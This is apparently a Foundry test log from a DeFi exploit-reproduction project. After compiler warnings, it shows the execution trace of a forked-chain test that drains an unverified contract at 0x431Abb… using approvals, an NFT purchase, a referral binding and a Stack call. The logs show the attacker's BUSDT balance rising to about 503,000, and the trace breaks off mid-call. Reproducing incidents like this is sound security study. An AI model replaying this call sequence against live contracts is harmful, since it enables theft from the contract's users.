Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.51s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 216.25ms (119.50µs CPU time)

Ran 1 test for src/test/2023-12/UnverifiedContr_0x431abb_exp.sol:ContractTest
[PASS] testExploit() (gas: 3381884)
Logs:
  Exploiter BUSDT balance before attack: 1180.008559000000000000
  Exploiter FCN balance before attack: 0.000190000000000000
  Exploiter BUSDT balance after attack: 503468.345335579475662703
  Exploiter FCN balance after attack: 125.887064171666012340

Traces:
  [3890384] ContractTest::testExploit()
    ├─ [2626] TRUST::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return] 
    ├─ [626] TRUST::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(TRUST: [0x31952292c193c05AE91e19456312E2Be1419c040])
    │   └─ ← [Return] [0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4], []
    ├─ [0] VM::load(TRUST: [0x31952292c193c05AE91e19456312E2Be1419c040], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: TRUST: [0x31952292c193c05AE91e19456312E2Be1419c040], slot: 69754373171698122749132262717936541513022023835681898290461777562612473346212 [6.975e76])
    ├─ [0] VM::load(TRUST: [0x31952292c193c05AE91e19456312E2Be1419c040], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [626] TRUST::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(TRUST: [0x31952292c193c05AE91e19456312E2Be1419c040], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return] 
    ├─ [626] TRUST::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(TRUST: [0x31952292c193c05AE91e19456312E2Be1419c040], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ emit SlotFound(who: TRUST: [0x31952292c193c05AE91e19456312E2Be1419c040], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 69754373171698122749132262717936541513022023835681898290461777562612473346212 [6.975e76])
    ├─ [0] VM::load(TRUST: [0x31952292c193c05AE91e19456312E2Be1419c040], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(TRUST: [0x31952292c193c05AE91e19456312E2Be1419c040], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4, 0x000000000000000000000000000000000000000000000000064fa776b71b8703)
    │   └─ ← [Return] 
    ├─ [626] TRUST::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 454766215707723523 [4.547e17]
    ├─ [2626] KLEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return] 
    ├─ [626] KLEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(KLEN: [0x05CbF8417401028dE10d6B949061336dF8233a9f])
    │   └─ ← [Return] [0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c], []
    ├─ [0] VM::load(KLEN: [0x05CbF8417401028dE10d6B949061336dF8233a9f], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: KLEN: [0x05CbF8417401028dE10d6B949061336dF8233a9f], slot: 13407199363679635973052879518465057167389910613330280238043615909335847287356 [1.34e76])
    ├─ [0] VM::load(KLEN: [0x05CbF8417401028dE10d6B949061336dF8233a9f], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [626] KLEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(KLEN: [0x05CbF8417401028dE10d6B949061336dF8233a9f], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return] 
    ├─ [626] KLEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(KLEN: [0x05CbF8417401028dE10d6B949061336dF8233a9f], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ emit SlotFound(who: KLEN: [0x05CbF8417401028dE10d6B949061336dF8233a9f], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 13407199363679635973052879518465057167389910613330280238043615909335847287356 [1.34e76])
    ├─ [0] VM::load(KLEN: [0x05CbF8417401028dE10d6B949061336dF8233a9f], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(KLEN: [0x05CbF8417401028dE10d6B949061336dF8233a9f], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x00000000000000000000000000000000000000000000013d054d97f7d45fffff)
    │   └─ ← [Return] 
    ├─ [626] KLEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 5847999999999999999999 [5.847e21]
    ├─ [2648] MDAO::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return] 
    ├─ [648] MDAO::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(MDAO: [0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950])
    │   └─ ← [Return] [0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4], []
    ├─ [0] VM::load(MDAO: [0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: MDAO: [0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950], slot: 69754373171698122749132262717936541513022023835681898290461777562612473346212 [6.975e76])
    ├─ [0] VM::load(MDAO: [0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [648] MDAO::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(MDAO: [0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return] 
    ├─ [648] MDAO::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(MDAO: [0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ emit SlotFound(who: MDAO: [0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 69754373171698122749132262717936541513022023835681898290461777562612473346212 [6.975e76])
    ├─ [0] VM::load(MDAO: [0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(MDAO: [0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950], 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4, 0x0000000000000000000000000000000000000000000000a5e207db6cd7502f98)
    │   └─ ← [Return] 
    ├─ [648] MDAO::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 3060000000000000012184 [3.06e21]
    ├─ [2626] FCN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return] 
    ├─ [626] FCN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(FCN: [0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08])
    │   └─ ← [Return] [0xcbca2c2e1a1577eb2e25b9dce980a2cead88d4a5422449a454760a1d38d5b82a], []
    ├─ [0] VM::load(FCN: [0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08], 0xcbca2c2e1a1577eb2e25b9dce980a2cead88d4a5422449a454760a1d38d5b82a) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: FCN: [0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08], slot: 92176716289232067132282836272875158765230181307894676212186306738099599030314 [9.217e76])
    ├─ [0] VM::load(FCN: [0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08], 0xcbca2c2e1a1577eb2e25b9dce980a2cead88d4a5422449a454760a1d38d5b82a) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [626] FCN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(FCN: [0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08], 0xcbca2c2e1a1577eb2e25b9dce980a2cead88d4a5422449a454760a1d38d5b82a, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return] 
    ├─ [626] FCN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(FCN: [0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08], 0xcbca2c2e1a1577eb2e25b9dce980a2cead88d4a5422449a454760a1d38d5b82a, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ emit SlotFound(who: FCN: [0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 92176716289232067132282836272875158765230181307894676212186306738099599030314 [9.217e76])
    ├─ [0] VM::load(FCN: [0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08], 0xcbca2c2e1a1577eb2e25b9dce980a2cead88d4a5422449a454760a1d38d5b82a) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(FCN: [0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08], 0xcbca2c2e1a1577eb2e25b9dce980a2cead88d4a5422449a454760a1d38d5b82a, 0x0000000000000000000000000000000000000000000000000000accdd281e000)
    │   └─ ← [Return] 
    ├─ [626] FCN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 190000000000000 [1.9e14]
    ├─ [2531] BUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26510000000000000000 [2.651e19]
    ├─ [0] VM::record()
    │   └─ ← [Return] 
    ├─ [531] BUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26510000000000000000 [2.651e19]
    ├─ [0] VM::accesses(BUSDT: [0x55d398326f99059fF775485246999027B3197955])
    │   └─ ← [Return] [0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96], []
    ├─ [0] VM::load(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000016fe6708b439b0000
    ├─ [0] VM::load(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000016fe6708b439b0000
    ├─ [531] BUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26510000000000000000 [2.651e19]
    ├─ [0] VM::store(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ [531] BUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x0000000000000000000000000000000000000000000000016fe6708b439b0000)
    │   └─ ← [Return] 
    ├─ emit SlotFound(who: BUSDT: [0x55d398326f99059fF775485246999027B3197955], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 81201235000773904770131445719184449197250777359516868712991521815545917127830 [8.12e76])
    ├─ [0] VM::load(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000016fe6708b439b0000
    ├─ [0] VM::store(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x00000000000000000000000000000000000000000000003ff7e88c750b91f000)
    │   └─ ← [Return] 
    ├─ [531] BUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1180008559000000000000 [1.18e21]
    ├─ [531] BUSDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1180008559000000000000 [1.18e21]
    ├─ [2425] BUSDT::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Exploiter BUSDT balance before attack", val: 1180008559000000000000 [1.18e21], decimals: 18)
    ├─ [626] FCN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 190000000000000 [1.9e14]
    ├─ [295] FCN::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Exploiter FCN balance before attack", val: 190000000000000 [1.9e14], decimals: 18)
    ├─ [24643] KLEN::approve(vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24643] TRUST::approve(vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24643] MDAO::approve(vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24643] FCN::approve(vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24562] BUSDT::approve(BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [202460] BUSDT_MetaWin::buy(7690)
    │   ├─ [10834] BUSDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xC927A27b6231783AB75eb60eFb0A3b06b97D0Bff, 42500000000000000000 [4.25e19])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xC927A27b6231783AB75eb60eFb0A3b06b97D0Bff, value: 42500000000000000000 [4.25e19])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], value: 115792089237316195423570985008687907853269984665640564039415084007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [27934] BUSDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd3Ed11fAB473b1B697D39B7E98da4eE9f180203f, 127500000000000000000 [1.275e20])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xd3Ed11fAB473b1B697D39B7E98da4eE9f180203f, value: 127500000000000000000 [1.275e20])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], value: 115792089237316195423570985008687907853269984665640564039287584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [133119] 0x238f5426D18e117158dAf175Ad479c6180e88070::9ca89d1c(00000000000000000000000090bf82c772f16651d6ae51d42c90c84ae703eb420000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000001e0a)
    │   │   ├─ emit Approval(_owner: BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], _approved: 0x0000000000000000000000000000000000000000, _tokenId: 7690)
    │   │   ├─ emit Transfer(_from: BUSDT_MetaWin: [0x90bf82c772f16651d6ae51D42c90c84aE703Eb42], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 7690)
    │   │   └─ ← [Stop] 
    │   ├─ emit buyEvent(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 7690)
    │   └─ ← [Stop] 
    ├─ [70771] BindingContract::bindParent(addrToBind: [0x041285A02A7fabc448893f6c1766e4B592f46f96])
    │   ├─ emit BingParent(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : addrToBind: [0x041285A02A7fabc448893f6c1766e4B592f46f96])
    │   └─ ← [Stop] 
    ├─ [44419] vulnContract::1f6b08a4(0000000000000000000000000000000000000000000000000000000000000001)
    │   ├─ [2362] 0xe39cdA8ca56589B0429B580b8f942bE6A936c4da::bbe6c24c() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000024a32a033f08000
    │   ├─ [10950] KLEN::burnFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 303030303030303030303 [3.03e20])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039154553704882826609632 [1.157e77])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 303030303030303030303 [3.03e20])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   └─ ← [Stop] 
    ├─ [458441] vulnContract::Stack(200000000000000000000 [2e20])
    │   ├─ [727] 0x238f5426D18e117158dAf175Ad479c6180e88070::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [362] 0xe39cdA8ca56589B0429B580b8f942bE6A936c4da::bbe6c24c() [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000024a32a033f08000
    │   ├─ [2531] BUSDT::balanceOf(0xff77a0B56E45990cF39C2f9bA6bd630F76C395e3) [staticcall]
    │   │   └─ ← [Return] 498146142324551248481742 [4.981e23]
    │   ├─ [2626] TRUST::balanceOf(0xff77a0B56E45990cF39C2f9bA6bd630F76C395e3) [staticcall]
    │   │   └─ ← [Return] 1378983220331919441950 [1.378e21]
    │   ├─ [2626] TRUST::balanceOf(0x1889a1C801B523EBF9C885F22d6b81F149d222Da) [staticcall]
    │   │   └─ ← [Return] 4037621732736356690413 [4.037e21]
    │   ├─ [2648] MDAO::balanceOf(0x1889a1C801B523EBF9C885F22d6b81F149d222Da) [staticcall]
    │   │   └─ ← [Return] 56115775657011601778067785 [5.611e25]
    │   ├─ [2531] BUSDT::balanceOf(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10]) [staticcall]
    │   │   └─ ← [Return] 512963361056079475662703 [5.129e23]
    │   ├─ [2626] FCN::balanceOf(FCN_BUSDT: [0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10]) [staticcall]
    │   │   └─ ← [Return] 501971077397338362 [5.019e17]
    │   ├─ [6150] KLEN::burnFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 969696969696969696969 [9.696e20])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564038184856735185856912663 [1.157e77])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 969696969696969696969 [9.696e20])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [10950] TRUST::burnFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16609381502749691 [1.66e16])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039457567398531626890244 [1.157e77])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 16609381502749691 [1.66e16])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [11005] MDAO::burnFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 76946974226034194305 [7.694e19])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: vulnContract: [0x431Abb27dAB05f4E7cDeAA18390fE39364197500], value: 115792089237316195423570985008687907853269984665640564039380637033687095445630 [1.157e77])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 76946974226034194305 [7.694e19])
